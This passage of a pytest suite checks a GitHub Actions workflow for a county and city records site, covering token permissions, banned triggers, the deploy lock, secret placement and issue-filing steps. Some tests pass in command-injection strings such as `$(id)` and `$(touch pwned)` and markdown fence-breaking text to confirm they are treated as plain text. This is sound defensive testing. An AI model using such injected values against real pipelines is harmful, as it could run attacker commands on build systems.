# ------------------------------------------------------------------ least privilege, every workflow in the repo
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.y*ml"))


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_job_states_its_own_permissions(path):
    wf = yaml.safe_load(path.read_text(encoding="utf-8"))
    assert wf.get("permissions") == {}, "top-level permissions must be {} so each job grants only its own"
    for name, job in wf["jobs"].items():
        assert isinstance(job.get("permissions"), dict), f"{path.name}: job {name} has no explicit permissions"
        assert "write-all" not in str(job["permissions"])


def _grants_write(perms) -> bool:
    """contents: write or pull-requests: write, by name or by write-all. No permissions key at all counts as a grant:
    the token then has the repository's default, which may be write."""
    if perms is None:
        return True
    if isinstance(perms, str):
        return perms == "write-all"
    return perms.get("contents") == "write" or perms.get("pull-requests") == "write"


def test_only_the_push_job_can_write_contents_or_pull_requests():
    """M-2 (architect, 2026-11-17): a data-only PR merged by any workflow is never checked by the gate, so across every
    workflow only daily-update.yml's push job may hold contents: write or pull-requests: write. Reopen ADR 0009's
    residual if another job needs them."""
    assert WORKFLOWS
    writers = []
    for path in WORKFLOWS:
        wf = yaml.safe_load(path.read_text(encoding="utf-8"))
        if "permissions" in wf and _grants_write(wf["permissions"]):
            writers.append((path.name, "(top level)"))
        for name, job in wf["jobs"].items():
            if _grants_write(job.get("permissions", wf.get("permissions"))):
                writers.append((path.name, name))
    assert writers == [("daily-update.yml", "push")], writers
    assert _grants_write(None) and _grants_write("write-all") and _grants_write({"pull-requests": "write"})
    assert not _grants_write({}) and not _grants_write("read-all") and not _grants_write({"issues": "write"})


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_no_untrusted_triggers_and_no_echoed_credentials(path):
    text = path.read_text(encoding="utf-8")
    wf = yaml.safe_load(text)
    on = wf.get("on") or wf[True]
    # T2 (main-protect invariant, ADR 0010): no trigger that runs a workflow on an event someone without write
    # access can cause (V1 is false, so such a run's write token could merge into main)
    banned = {"pull_request_target", "workflow_run", "pull_request", "issue_comment", "issues"}
    assert not set(on) & banned, sorted(set(on) & banned)
    assert not [t for t in on if str(t).startswith(("discussion", "pull_request_review"))], list(on)
    assert _secret_uses(wf) == (ALLOWED_SECRETS if path.name == "daily-update.yml" else [])
    for line in text.splitlines():
        s = line.strip()
        if s.startswith(("echo", "printf", "run: echo", "run: printf")):
            assert not re.search(r"github\.token|GH_TOKEN|GITHUB_TOKEN|ACTIONS_\w*TOKEN", s), line


def test_a_hard_failure_never_reaches_main_and_the_exit_codes_are_documented():
    """A failed fetch never deletes data: on any hard exit code the Collect step fails, so the data artifact is not
    uploaded and the push job (which needs a successful update) never runs. Only the warnings pass: county 6
    (partial), county 5 (RPC failed; its files are restored by the step, everything else publishes), county 7
    (the shrink guard kept county documents as committed; everything else publishes) and city 7 (the city shrink
    guard kept city rows or meetings: docs/adr/0006-daily-refresh-data-guards.md)."""
    steps = {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}
    assert steps["Upload refreshed data"]["if"].startswith("success() && ")
    assert "update" in WF["jobs"]["push"]["needs"] and "always()" not in WF["jobs"]["push"]["if"]
    script = steps["Collect (polite fetch, parse, verify)"]["run"]
    cases = [(0, 0, 0), (0, 6, 0), (0, 5, 0), (0, 7, 0), (2, 0, 1), (5, 0, 1), (0, 2, 1), (0, 3, 1), (0, 4, 1),
             (2, 5, 1), (5, 6, 1), (2, 7, 1), (7, 0, 0), (7, 7, 0), (7, 5, 0), (7, 2, 1), (7, 3, 1)]
    for city, county, ok in cases:
        fake = script.replace("python -m collector city run --agendas; city=$?", f"city={city}").replace(
            'python -m collector run "${shrink[@]}"; county=$?', f"county={county}")
        r = subprocess.run(["bash", "-c", fake], env={**os.environ, "GITHUB_OUTPUT": os.devnull},
                           capture_output=True, text=True)
        assert (r.returncode != 0) == bool(ok), (city, county, r.stdout, r.stderr)
    runbook = (ROOT / "docs" / "ops" / "launch-runbook.md").read_text(encoding="utf-8")
    for phrase in ("**Hard failure**", "**Partial**", "county 6", "5 the RPC step failed",
                   "A failed fetch never deletes data", "at most 40 requests", "**RPC only**", "**RPC backlog**",
                   "repeats every day until someone acts", "python -m collector rpc fetch --limit 30",
                   "**County meetings kept**", "county 7", "Daily update: county meetings kept", "allow_shrink",
                   "**City meetings kept**", "city 7", "Daily update: city meetings kept", "dropped_unminuted",
                   "python -m collector city run --allow-drop <id>[,<id>] --limit 0"):
        assert phrase in runbook, phrase


def test_deploy_lock_is_checked_exactly_before_publishing():
    """ci/deploy-lock-case-insensitive: GitHub's == ignores case, so the deploy job's first step checks the variable
    again in bash, an exact match, before the deploy-pages step; it passes only on exactly 'true'."""
    steps = WF["jobs"]["deploy"]["steps"]
    assert [s.get("name") for s in steps] == ["Check the deploy lock is exactly 'true'", "Deploy to GitHub Pages"]
    check = steps[0]
    assert check["env"] == {"E": "${{ vars.RECORDS_DEPLOY_ENABLED }}"} and check["run"] == '[ "$E" = true ]'
    assert set(check) == {"name", "env", "run"}                    # no `if:` or continue-on-error can skip it
    assert steps[1]["uses"].startswith("actions/deploy-pages@")
    for value, ok in (("true", True), ("TRUE", False), ("True", False), (" true", False), ("true ", False),
                      ("", False), ("1", False), ("yes", False)):
        r = subprocess.run(["bash", "-c", check["run"]], env={"E": value, "PATH": os.environ["PATH"]})
        assert (r.returncode == 0) is ok, value


def test_deploy_stays_locked_and_is_the_only_publishing_step():
    assert sum(TEXT.count(a) for a in ("actions/deploy-pages@", "peaceiris/", "gh-pages")) == 1
    assert _deploy_if().startswith(LOCK)
    assert "RECORDS_DEPLOY_ENABLED" not in "\n".join(s.get("run", "") for j in WF["jobs"].values()
                                                       for s in j["steps"])     # never set by the workflow itself


# ------------------------------------------------------------------ the issue steps, run with a stub `gh`
def _run_issue_step(tmp_path, step, open_issue="", run_log=None, extra_env=None):
    """Run a workflow step's script in tmp_path with a stub gh; return (gh calls, text of every body)."""
    work, bindir = tmp_path / "work", tmp_path / "bin"
    (work / "build").mkdir(parents=True, exist_ok=True)
    bindir.mkdir(exist_ok=True)
    if run_log is not None:
        (work / "build" / "run-log.json").write_text(run_log, encoding="utf-8")
    calls, bodies = tmp_path / "gh-calls", tmp_path / "bodies"
    gh = bindir / "gh"
    gh.write_text("#!/bin/bash\n"
                  f'echo "$@" >> "{calls}"\n'
                  f'if [ "$2" = list ]; then echo "{open_issue}"; fi\n'
                  'for ((i=1; i<=$#; i++)); do j=$((i+1)); '
                  f'if [ "${{!i}}" = --body-file ]; then cat "${{!j}}" >> "{bodies}"; fi; '
                  f'if [ "${{!i}}" = --body ]; then echo "${{!j}}" >> "{bodies}"; fi; done\n')
    gh.chmod(0o755)
    env = {**os.environ, **{k: v for k, v in (step.get("env") or {}).items() if "${{" not in str(v)},
           "PATH": f"{bindir}:{os.environ['PATH']}", "RUNNER_TEMP": str(tmp_path), "GITHUB_SERVER_URL": "https://x",
           "GITHUB_REPOSITORY": "o/r", "GITHUB_RUN_ID": "1", **(extra_env or {})}
    subprocess.run(["bash", "-c", step["run"]], cwd=work, env=env, check=True)
    return calls.read_text().splitlines(), (bodies.read_text() if bodies.exists() else "")


def _rpc_issue_step():
    return {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}["Open or update the RPC issue"]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
def test_rpc_issue_strips_backticks_so_site_text_stays_in_the_fence(tmp_path):
    """ci/issue-markdown-fence: a status holding ``` (text from the site) cannot close the code fence."""
    status = "stopped: FetchFailed ```\n# injected heading\n``` https://www.cmcrpc.com/x.pdf"
    _, body = _run_issue_step(tmp_path, _rpc_issue_step(), run_log=json.dumps({"rpc": {"status": status}}))
    assert body.count("```") == 2                                      # only the step's own fence
    assert "injected heading" in body and "https://www.cmcrpc.com/x.pdf" in body


@pytest.mark.parametrize("run_log", [None, "{not json", '{"rpc": {}}'])
def test_rpc_issue_reason_is_unknown_without_a_readable_run_log(tmp_path, run_log):
    """ci/issue-reason-missing: no run-log.json, a broken one, or no status: the reason reads 'unknown'."""
    calls, body = _run_issue_step(tmp_path, _rpc_issue_step(), run_log=run_log)
    fenced = body.split("```")[1].strip()
    assert fenced == "unknown" and calls[-1].startswith("issue create")


def _cc_issue_step():
    return {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}["Open or update the county committee agendas issue"]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
def test_county_committees_issue_strips_backticks_so_site_text_stays_in_the_fence(tmp_path):
    """ci/issue-markdown-fence: a status holding ``` (text from the county's page) cannot close the code fence."""
    status = "stopped, nothing changed: HostRefused ```\n# injected heading\n``` https://montgomerytn.gov/x.pdf"
    calls, body = _run_issue_step(tmp_path, _cc_issue_step(),
                                  run_log=json.dumps({"county_committees": {"exit": 2, "status": status}}))
    assert body.count("```") == 2                                      # only the step's own fence
    assert "injected heading" in body and "https://montgomerytn.gov/x.pdf" in body
    assert calls[-1].startswith("issue create")
    assert "--title Daily update: county committee agendas step failed" in calls[-1]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
def test_county_committees_issue_status_is_text_not_shell(tmp_path):
    """A status holding $(...) or backtick command text is printed as text, never run."""
    status = "error, nothing changed: $(id) `id` ${HOME} $(touch pwned)"
    _, body = _run_issue_step(tmp_path, _cc_issue_step(),
                              run_log=json.dumps({"county_committees": {"exit": 1, "status": status}}))
    assert "$(id)" in body and "${HOME}" in body and "$(touch pwned)" in body
    assert "uid=" not in body and not (tmp_path / "work" / "pwned").exists()


@pytest.mark.parametrize("run_log", [None, "{not json", '{"county_committees": {"exit": 2}}'])
def test_county_committees_issue_reason_is_unknown_without_a_readable_run_log(tmp_path, run_log):
    """ci/issue-reason-missing: no run-log.json, a broken one, or no status: the reason reads 'unknown'."""
    calls, body = _run_issue_step(tmp_path, _cc_issue_step(), run_log=run_log)
    assert body.split("```")[1].strip() == "unknown" and calls[-1].startswith("issue create")


@pytest.mark.parametrize("open_issue", ["", "42"])
def test_county_committees_repeat_failure_comments_on_the_open_issue(tmp_path, open_issue):
    calls, _ = _run_issue_step(tmp_path, _cc_issue_step(), open_issue=open_issue,
                               run_log=json.dumps({"county_committees": {"exit": 4, "status": "nothing changed"}}))
    assert calls[-1].startswith("issue comment 42" if open_issue else "issue create")


def _cc_exit_lines() -> str:
    """The collect step's county-committees-exit lines, run on their own."""
    run = {s.get("id"): s for s in WF["jobs"]["update"]["steps"]}["collect"]["run"]
    return run.split("# county-committees-exit")[1].split("# end county-committees-exit")[0]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
@pytest.mark.parametrize("run_log,want", [
    ('{"county_committees": {"exit": 2}}', "failed"),
    ('{"county_committees": {"exit": 4}}', "failed"),
    ('{"county_committees": {"exit": 1}}', "failed"),
    ('{"county_committees": {"exit": 3}}', "failed"),
    ('{"county_committees": {"exit": 0}}', "ok"),
    ('{"county_committees": {}}', "ok"),            # unreadable: no exit (the county run itself failed)
    ("{}", "ok"),
    ("{not json", "ok"),
    (None, "ok"),                                   # no run log at all
])
def test_county_committees_exit_other_than_0_or_unreadable_is_failed(tmp_path, run_log, want):
    (tmp_path / "build").mkdir()
    if run_log is not None:
        (tmp_path / "build" / "run-log.json").write_text(run_log, encoding="utf-8")
    out = tmp_path / "out"
    subprocess.run(["bash", "-c", "set -u\n" + _cc_exit_lines()], cwd=tmp_path, check=True,
                   env={**os.environ, "GITHUB_OUTPUT": str(out)})
    assert out.read_text().strip() == f"county_committees={want}"


def _cb_exit_lines() -> str:
    """The collect step's city-books-exit lines, run on their own (budget/kept-warning-unseen)."""
    run = {s.get("id"): s for s in WF["jobs"]["update"]["steps"]}["collect"]["run"]
    return run.split("# city-books-exit")[1].split("# end city-books-exit")[0]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
@pytest.mark.parametrize("run_log,want", [
    ('{"city_books": {"clarksville-tn": {"build": 3, "warning": "city books clarksville-tn: kept"}}}', "kept"),
    ('{"city_books": {"clarksville-tn": {"build": 2, "warning": "city books clarksville-tn: stopped"}}}', "kept"),
    ('{"city_books": {"clarksville-tn": {"error": "OSError: x", "warning": "w"}, "b": {"build": 0}}}', "kept"),
    ('{"city_books": {"clarksville-tn": {"build": 0}}}', "ok"),
    ('{"city_books": {}}', "ok"),
    ("{}", "ok"),
    ("{not json", "ok"),
    (None, "ok"),                                   # no run log at all: the county run's own failure reports it
])
def test_city_books_warning_is_output_as_kept(tmp_path, run_log, want):
    (tmp_path / "build").mkdir()
    if run_log is not None:
        (tmp_path / "build" / "run-log.json").write_text(run_log, encoding="utf-8")
    out = tmp_path / "out"
    subprocess.run(["bash", "-c", "set -u\n" + _cb_exit_lines()], cwd=tmp_path, check=True,
                   env={**os.environ, "GITHUB_OUTPUT": str(out)})
    assert out.read_text().strip() == f"city_books={want}"


def _cb_issue_step():
    return {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}["Open or update the city budget books issue"]


def test_city_books_issue_runs_only_on_kept_and_never_blocks_publishing():
    step = _cb_issue_step()
    assert step["if"] == "always() && steps.collect.outputs.city_books == 'kept'"
    assert step["continue-on-error"] is True and "${{" not in step["run"]


@pytest.mark.skipif(not shutil.which("jq"), reason="jq not installed")
def test_city_books_issue_warning_is_fenced_text_not_shell(tmp_path):
    """ci/issue-markdown-fence: a warning holding ``` or $(...) stays text inside the step's own fence."""
    warning = "city books clarksville-tn: OSError ```\n# injected heading\n``` $(touch pwned) `id`"
    calls, body = _run_issue_step(tmp_path, _cb_issue_step(),
                                  run_log=json.dumps({"city_books": {"clarksville-tn": {"warning": warning}}}))
    assert body.count("```") == 2 and "injected heading" in body and "$(touch pwned)" in body
    assert not (tmp_path / "work" / "pwned").exists()
    assert calls[-1].startswith("issue create") and "--title Daily update: city budget books kept" in calls[-1]


@pytest.mark.parametrize("run_log", [None, "{not json", '{"city_books": {"clarksville-tn": {"build": 0}}}'])
def test_city_books_issue_reason_is_unknown_without_a_readable_run_log(tmp_path, run_log):
    calls, body = _run_issue_step(tmp_path, _cb_issue_step(), run_log=run_log)
    assert body.split("```")[1].strip() == "unknown" and calls[-1].startswith("issue create")


@pytest.mark.parametrize("open_issue", ["", "42"])
def test_city_books_repeat_kept_comments_on_the_open_issue(tmp_path, open_issue):
    calls, _ = _run_issue_step(tmp_path, _cb_issue_step(), open_issue=open_issue,
                               run_log=json.dumps({"city_books": {"clarksville-tn": {"warning": "kept"}}}))
    assert calls[-1].startswith("issue comment 42" if open_issue else "issue create")


@pytest.mark.parametrize("job", ["update", "push"])
@pytest.mark.parametrize("open_issue", ["", "42"])
def test_a_repeat_failure_comments_on_the_open_issue(tmp_path, job, open_issue):
    """ci/failure-issue-silent-repeat: the first failure opens "Daily update failed", a later one comments on it."""
    step = [s for s in WF["jobs"][job]["steps"] if s.get("name") == "Open an issue on failure"][0]
    assert "${{" not in step["run"]                                    # values come in through env only
    calls, body = _run_issue_step(tmp_path, step, open_issue=open_issue, extra_env={"CITY_EXIT": "2",
                                                                                     "COUNTY_EXIT": "0"})
    assert calls[0].startswith("issue list") and len(calls) == 2
    assert calls[1].startswith("issue comment 42" if open_issue else "issue create")
    assert "actions/runs/1" in body and "unchanged" in body
    if job == "update":
        assert "city=2, county=0" in body


# ------------------------------------------------------------------ the morning note (T4.5)
NOTE_IF = ("github.event_name == 'schedule' && vars.MORNING_NOTE_SEND == 'true' && github.ref == 'refs/heads/main'"
           " && needs.gate.outputs.verified == 'true'")
# main-protect/pr-check-path-scope, main-protect/test-launcher-coverage: the note job's three python runs, exactly
# (-I -S, a fresh pycache_prefix, the staged sender folder alone on sys.path, the staged config), each after VERIFY,
# the re-check of the staged folder's digest (main-protect/staged-lib-integrity).
# main-protect/pycache-prefix-empty: the prefix folder is made on its own line, so a failed mktemp stops the step.
_PC = "pc=$(mktemp -d)\n"
_PY = """python -I -S -X pycache_prefix="$pc" -c """
LAUNCH = (_PC + _PY + """'import sys; sys.path.insert(0, sys.argv[1]); from sender.__main__ import main; """
          """sys.exit(main(sys.argv[2:]))' \\\n  "$NOTE_LIB/py" deliver --plan "$PLAN" --config "$NOTE_LIB/site.yml\"""")
LAUNCH_MAX = (_PC + "max=$(" + _PY + """'import sys; sys.path.insert(0, sys.argv[1]); from sender.common import """
              """MAX_PLAN_BYTES; print(int(MAX_PLAN_BYTES))' \\\n        "$NOTE_LIB/py")""")
VERIFY = """sum=$(cd "$NOTE_LIB" && { find . -printf '%y %m %p\\n' | LC_ALL=C sort &&
      find . -type f -print0 | LC_ALL=C sort -z | xargs -0 -r sha256sum; } | sha256sum)
if [ "${sum%% *}" != "$NOTE_LIB_SUM" ]; then
  echo "::error::the staged sender changed after it was staged. Nothing sent."; exit 2
fi
"""
STAGE_STEP = "Stage the sender outside the checkout"
PY_STEPS = {"Validate the plan files": LAUNCH_MAX, "Check the plan (dry run, no secret)": LAUNCH,
            "Deliver the morning note": LAUNCH}


def _ws(text: str) -> re.Pattern:
    """main-protect/test-exact-whitespace: `text` with any run of whitespace matching any other (the words exact)."""
    return re.compile(r"\s+".join(re.escape(w) for w in text.split()))


def _python_dir() -> Path:
    """main-protect/test-interpreter: a folder whose `python` is the interpreter running the tests, so the note-job
    steps' `python` is this one (as setup-python's is the job's), not whatever `python` comes first on PATH."""
    here = Path(sys.executable).parent
    if (here / "python").exists() and os.path.samefile(here / "python", sys.executable):
        return here
    # main-protect/test-tmp-symlink: a new private folder per run (mkdtemp: unpredictable name, mode 0700), never a
    # predictable /tmp path another user could plant first; removed when the tests end
    alt = Path(tempfile.mkdtemp(prefix="note-job-python-"))
    atexit.register(shutil.rmtree, alt, True)
    (alt / "python").symlink_to(sys.executable)
    assert os.path.samefile(alt / "python", sys.executable)
    return alt


PY_ENV = {**os.environ, "PATH": f"{_python_dir()}{os.pathsep}{os.environ.get('PATH', '')}"}


def test_the_python_folder_is_a_new_private_one_each_time(tmp_path, monkeypatch):
    """main-protect/test-tmp-symlink: with no `python` beside the interpreter, each call makes its own folder (owner
    only), so a planted /tmp/note-job-python-* folder or symlink is never reused."""
    exe = tmp_path / "bin" / "py3"
    exe.parent.mkdir()
    exe.symlink_to(sys.executable)
    monkeypatch.setattr(sys, "executable", str(exe))
    a, b = _python_dir(), _python_dir()
    assert a != b and a.parent == b.parent == Path(tempfile.gettempdir())
    for d in (a, b):
        assert d.stat().st_uid == os.getuid() and d.stat().st_mode & 0o777 == 0o700
        assert os.path.samefile(d / "python", exe)


def _note_steps():
    return {s.get("name"): s for s in WF["jobs"]["note"]["steps"]}


def test_note_job_is_locked_scheduled_on_main_and_after_deploy():
    note = WF["jobs"]["note"]
    assert " ".join(note["if"].split()) == NOTE_IF
    assert "always()" not in note["if"] and "cancelled()" not in note["if"]   # implicit success(): update and deploy
    assert note["needs"] == ["gate", "update", "deploy"]                        # deploy locked -> note skipped
    assert note["environment"] == "morning-note" and note["timeout-minutes"] <= 15
    # a manual run never sends: the if needs the schedule trigger, and only schedule and dispatch exist
    on = WF.get("on") or WF[True]
    assert set(on) == {"schedule", "workflow_dispatch"}


def test_note_job_has_a_timeout_and_shares_the_one_run_at_a_time_group():
    """Security (T4.8): never-twice across concurrent runs rests on one daily-update run at a time. The group is
    workflow-level, so it holds every job, the note job included; no job may set its own (it would leave the group)."""
    assert WF["concurrency"] == {"group": "daily-update", "cancel-in-progress": False}
    assert all("concurrency" not in job for job in WF["jobs"].values())
    assert isinstance(WF["jobs"]["note"]["timeout-minutes"], int) and 0 < WF["jobs"]["note"]["timeout-minutes"] <= 15
    assert all(isinstance(job.get("timeout-minutes"), int) for job in WF["jobs"].values())


def _note_if(event, var, ref, verified):
    return event == "schedule" and var == "true" and ref == "refs/heads/main" and verified == "true"


@pytest.mark.parametrize("event,var,ref,verified", list(itertools.product(
    ["schedule", "workflow_dispatch"], [None, "", "false", "True", "true"], ["refs/heads/main", "refs/heads/x"],
    ["true", "false", "", None])))
def test_note_runs_only_in_the_one_locked_case(event, var, ref, verified):
    """...and only when the gate verified main's history (never in phase 0)."""
    expr = " ".join(WF["jobs"]["note"]["if"].split())
    py = (expr.replace("github.event_name", repr(event)).replace("vars.MORNING_NOTE_SEND", repr(var))
          .replace("needs.gate.outputs.verified", repr(verified))
          .replace("github.ref", repr(ref)).replace("&&", "and"))
    assert eval(py) == _note_if(event, var, ref, verified)                      # noqa: S307  our own expression


@pytest.mark.parametrize("value", [
    "abc-1", "abc-1,def_2", "abc-1, def_2", "abc-1 def_2", "abc-1\ndef_2", " abc-1,\n def_2\tghi3 \n", "a*,b?\n[c]",
    "", "  \n",
    # note-job/mask-ifs-cr: a secret pasted with Windows line ends, and the other ASCII characters Python's \s splits on
    "abc-1\r\ndef_2\r\n", "abc-1,\r\ndef_2", "abc-1\rdef_2", "abc-1\vdef_2\fghi3", "abc-1\x1cdef_2\x1fghi3", "\r\n",
    # note-job/mask-unicode-ws: Unicode whitespace splits neither in bash nor in canary_ids (which then refuses)
    "abc-1\u00a0def_2", "\u00a0abc-1", "abc-1,\u2003def_2", "abc-1\u2028def_2", "abc-1\x85def_2",
])
def test_mask_step_masks_every_canary_id_deliver_accepts(value, tmp_path):
    """security-note-workflow L2: every id sender/deliver.py's canary_ids reads (commas or any whitespace, every
    line) is masked one by one, and nothing else is printed (no glob expansion of an id). The step runs in a folder
    holding files the glob ids would match (a1, bx, c), so dropping `set -f` fails this test."""
    from sender.deliver import PlanInvalid, canary_ids
    for name in ("a1", "bx", "c"):
        (tmp_path / name).write_text("")
    step = WF["jobs"]["note"]["steps"][0]
    r = subprocess.run(["bash", "-e", "-c", step["run"]], cwd=tmp_path, capture_output=True, text=True, check=True,
                       env={**os.environ, "CANARY_IDS": value})
    # split on "\n" only, as the runner reads workflow commands: splitlines() would also cut at \r, \x1c-\x1e,
    # \x85 or U+2028 inside an id (note-job/mask-ifs-cr)
    *lines, last = r.stdout.split("\n")
    assert last == ""                                       # every line ends with "\n" (or nothing is printed)
    masked = [line.removeprefix("::add-mask::") for line in lines]
    assert all(line.startswith("::add-mask::") for line in lines)
    expected = set(re.split(r"[ \t\n\r\v\f\x1c-\x1f,]+", value)) - {""}     # IFS: the comma and ASCII whitespace only
    assert set(masked) == expected
    if all(re.fullmatch(r"[A-Za-z0-9_-]{1,64}", p) for p in expected):
        assert set(masked) == canary_ids(value)
    else:                                                  # an id the step masked whole is refused, never sent
        with pytest.raises(PlanInvalid):
            canary_ids(value)


def test_note_job_least_privilege():
    note = WF["jobs"]["note"]
    assert note["permissions"] == {"contents": "read"}       # no token use: the history check is the gate's
    steps = note["steps"]
    assert steps[0]["name"] == "Mask the canary ids"                           # before anything else runs
    assert "::add-mask::" in steps[0]["run"]
    uses = [s["uses"] for s in steps if "uses" in s]
    assert [u.split("@")[0] for u in uses] == ["actions/checkout", "actions/setup-python", "actions/download-artifact"]
    co = _note_steps()["Check out this run's commit"]["with"]
    assert co == {"ref": "${{ needs.gate.outputs.sha }}", "persist-credentials": False}   # github.sha via the gate
    assert "cache" not in _note_steps()["Set up Python (standard library only, no pip step)"].get("with", {})
    assert _note_steps()["Download the morning note plan"]["with"]["path"] == "${{ runner.temp }}/morning-send"
    runs = "\n".join(s.get("run", "") for s in steps)
    assert not re.search(r"\bpip\b", runs) and "upload-artifact" not in str(steps) and "cache" not in str(uses)
    assert "GITHUB_STEP_SUMMARY" not in runs and "set -x" not in runs
    assert "${{" not in runs                                                     # nothing interpolated into bash
    assert len(_ws(LAUNCH).findall(_note_steps()["Deliver the morning note"]["run"])) == 1


def test_the_api_key_is_in_exactly_one_step_and_live_needs_the_variable():
    key_steps = [s["name"] for j in WF["jobs"].values() for s in j["steps"]
                 if "BUTTONDOWN_API_KEY" in (s.get("env") or {})]
    assert key_steps == ["Deliver the morning note"]
    deliver = _note_steps()["Deliver the morning note"]
    assert deliver["env"]["MORNING_NOTE_SEND"] == "${{ vars.MORNING_NOTE_SEND }}"
    for var, live in (("true", True), ("", False), ("false", False), ("TRUE", False)):
        script = _ws(LAUNCH).sub("echo ARGS", _ws(VERIFY).sub("", deliver["run"]))
        assert script.count("echo ARGS") == 1 and "NOTE_LIB_SUM" not in script
        r = subprocess.run(["bash", "-c", script], env={**os.environ, "MORNING_NOTE_SEND": var, "PLAN": "p.json"},
                           capture_output=True, text=True, check=True)
        assert ("--live" in r.stdout) == live, var
    # the job that parses untrusted PDFs holds no secret and no write token
    assert "secrets." not in str(WF["jobs"]["update"])


def test_the_plan_step_never_fails_the_daily_job():
    steps = {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}
    plan = steps["Plan the morning note (dry run, no network)"]
    assert plan["continue-on-error"] is True and "--rehearse" in plan["run"]
    assert plan["env"] == {"RECORDS_SITE_URL": "https://daylight.gnoshcodes.com/"}         # no secret, the site URL only
    names = list(steps)
    assert names.index("Site checks") < names.index("Plan the morning note (dry run, no network)")
    up = steps["Upload the morning note plan"]
    assert up["if"] == "success() && steps.plan.outcome == 'success'" and up["with"]["if-no-files-found"] == "ignore"
    assert up["with"]["name"] == "morning-send" and up["with"]["retention-days"] == 2
    # the note job comes after deploy, so nothing it does can hold back push or deploy
    assert "note" not in str(WF["jobs"]["push"].get("needs")) and "note" not in str(WF["jobs"]["deploy"]["needs"])


def _stage(cwd, runner):
    """Run the note job's 'Stage the sender outside the checkout' step in git checkout `cwd` with RUNNER_TEMP
    `runner`. Returns (process, {name: value} it wrote to GITHUB_ENV)."""
    env_file = Path(runner) / "stage-env"
    env_file.write_text("")
    r = subprocess.run(["bash", "-c", _note_steps()[STAGE_STEP]["run"]], cwd=cwd, capture_output=True, text=True,
                       env={**PY_ENV, "RUNNER_TEMP": str(runner), "GITHUB_ENV": str(env_file)})
    return r, dict(line.split("=", 1) for line in env_file.read_text().splitlines())


def _validate_plan(tmp_path, layout: dict, cwd=ROOT, env=None):
    """Run the note job's 'Validate the plan files' script over a plan folder built from {relative path: bytes}, after
    the stage step (the script imports MAX_PLAN_BYTES from the staged sender)."""
    step = _note_steps()["Validate the plan files"]
    root = tmp_path / "runner"
    root.mkdir(parents=True, exist_ok=True)
    staged, lib_env = _stage(cwd, root)
    assert staged.returncode == 0, staged.stderr
    env = {**(env or {}), **lib_env}
    for rel, data in layout.items():
        p = root / "morning-send" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if data is None:
            p.symlink_to("/etc/hostname")
        else:
            p.write_bytes(data)
    (root / "morning-send").mkdir(parents=True, exist_ok=True)
    env_file = tmp_path / "env"
    env_file.write_text("")
    r = subprocess.run(["bash", "-c", step["run"]], cwd=cwd, capture_output=True, text=True,
                       env={**PY_ENV, **(env or {}), "RUNNER_TEMP": str(root), "GITHUB_ENV": str(env_file)})
    return r.returncode, env_file.read_text()


GOOD = {"2026-11-12/plan.json": b"{}", "2026-11-12/edition-0123456789ab.html": b"x",
        "2026-11-12/edition-0123456789ab.txt": b"x"}


def test_the_plan_file_check_accepts_the_plan_stage_layout(tmp_path):
    code, env = _validate_plan(tmp_path, GOOD)
    assert code == 0 and env.strip().endswith("/morning-send/2026-11-12/plan.json")


@pytest.mark.parametrize("extra", [
    {"2026-11-12/run.sh": b"x"}, {"2026-11-12/edition-XYZ.html": b"x"}, {"2026-11-13/plan.json": b"{}"},
    {"notes.txt": b"x"}, {"2026-11-12/sub/plan.json": b"{}"}, {"2026-11-12/edition-0123456789ab.js": b"x"},
    {"2026-11-12/edition-aaaaaaaaaaaa.html": None},
])
def test_the_plan_file_check_refuses_anything_else(tmp_path, extra):
    code, env = _validate_plan(tmp_path, {**GOOD, **extra})
    assert code != 0 and env == ""


def test_the_plan_file_check_refuses_a_missing_plan_or_a_bad_day(tmp_path):
    assert _validate_plan(tmp_path / "a", {"2026-11-12/edition-0123456789ab.html": b"x"})[0] != 0
    assert _validate_plan(tmp_path / "b", {"latest/plan.json": b"{}"})[0] != 0
    assert _validate_plan(tmp_path / "c", {})[0] != 0


def test_the_plan_file_check_uses_max_plan_bytes():
    from sender.common import MAX_PLAN_BYTES
    assert MAX_PLAN_BYTES > 2_000_000                                             # not the old 2 MB
    run = _note_steps()["Validate the plan files"]["run"]
    assert "from sender.common import MAX_PLAN_BYTES" in run


@pytest.mark.parametrize("open_issue", ["", "9"])
def test_note_failure_opens_its_own_issue_from_a_separate_job(tmp_path, open_issue):
    nf = WF["jobs"]["note-failed"]
    assert nf["needs"] == "note"
    assert nf["if"] == "always() && (needs.note.result == 'failure' || needs.note.result == 'cancelled')"
    assert nf["permissions"] == {"issues": "write"} and "issues" not in WF["jobs"]["note"]["permissions"]
    step = nf["steps"][0]
    assert step["env"]["NOTE_TITLE"] == "Daily update: morning note failed"
    assert "${{" not in step["run"]                                              # fixed text only
    calls, body = _run_issue_step(tmp_path, step, open_issue=open_issue)
    assert calls[1].startswith("issue comment 9" if open_issue else "issue create") and len(calls) == 2
    assert "not affected" in body and "morning-note.md" in body


def test_the_note_runbook_exists_with_the_switches():
    text = (ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8")
    for phrase in ("MORNING_NOTE_SEND", "BUTTONDOWN_API_KEY", "MORNING_NOTE_CANARY_IDS", "morning-note",
                   "T4.0", "No canary week", "Go-live", "Rollback", "link_hosts", "canary_only", "Deployment branches"):
        assert phrase in text, phrase
    # main-protect/actions-bypass-reopens-M1: the runbook says who can reach the key and offers the one human lock
    for phrase in ("anyone with write or admin access to this repository can reach the Buttondown key",
                   "Keep collaborators to the minimum", "accident prevention plus an audit trail", "Required reviewers",
                   "Prevent self-review", "Review deployments", "Never leave a run waiting", PR_STEP):
        assert phrase in " ".join(text.split()), phrase


@pytest.mark.parametrize("result,fires", [("failure", True), ("cancelled", True), ("success", False),
                                          ("skipped", False)])
def test_note_failed_fires_on_failure_or_cancel_never_on_skip(result, fires):
